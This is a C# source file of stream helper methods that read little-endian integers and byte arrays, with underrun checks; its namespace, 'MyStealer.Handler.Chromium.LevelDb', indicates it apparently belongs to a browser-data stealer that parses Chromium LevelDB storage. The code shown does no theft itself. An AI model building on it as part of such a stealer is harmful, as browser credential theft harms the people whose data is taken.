using Serilog;
using System;
using System.IO;

namespace MyStealer.Handler.Chromium.LevelDb
{
    public static class StreamExtension
    {
        public static ulong ReadLeUInt64(this Stream stream)
        {
            const int size = 8;
            var buffer = new byte[size];
            var read = stream.Read(buffer, 0, size);
            if (read != size)
                throw new Exception("Buffer Underrun: expected " + size + " got " + read);
            return buffer.ToLeUInt64();
        }

        public static uint ReadLeUInt32(this Stream stream)
        {
            const int size = 4;
            var buffer = new byte[size];
            var read = stream.Read(buffer, 0, size);
            if (read != size)
                throw new Exception("Buffer Underrun: expected " + size + " got " + read);
            return buffer.ToLeUInt32();
        }

        public static ushort ReadLeUInt16(this Stream stream)
        {
            const int size = 2;
            var buffer = new byte[size];
            var read = stream.Read(buffer, 0, size);
            if (read != size)
                throw new Exception("Buffer Underrun: expected " + size + " got " + read);
            return buffer.ToLeUInt16();
        }
        public static long ReadLeInt64(this Stream stream)
        {
            const int size = 8;
            var buffer = new byte[size];
            var read = stream.Read(buffer, 0, size);
            if (read != size)
                throw new Exception("Buffer Underrun: expected " + size + " got " + read);
            return buffer.ToLeInt64();
        }

        public static int ReadLeInt32(this Stream stream)
        {
            const int size = 4;
            var buffer = new byte[size];
            var read = stream.Read(buffer, 0, size);
            if (read != size)
                throw new Exception("Buffer Underrun: expected " + size + " got " + read);
            return buffer.ToLeInt32();
        }

        public static short ReadLeInt16(this Stream stream)
        {
            const int size = 2;
            var buffer = new byte[size];
            var read = stream.Read(buffer, 0, size);
            if (read != size)
                throw new Exception("Buffer Underrun: expected " + size + " got " + read);
            return buffer.ToLeInt16();
        }

        public static byte[] ReadBytes(this Stream stream, int length)
        {
            var buffer = new byte[length];
            var read = stream.Read(buffer, 0, length);
            if (read != length)
            {
                //throw new Exception("Buffer Underrun: expected " + length + " got " + read);
                // todo: debug warning meessage
                //Log.Warning("Stream buffer underrun! Expected {exp}, got {act}", length, read);
            }
            return buffer;
        }
    }
}
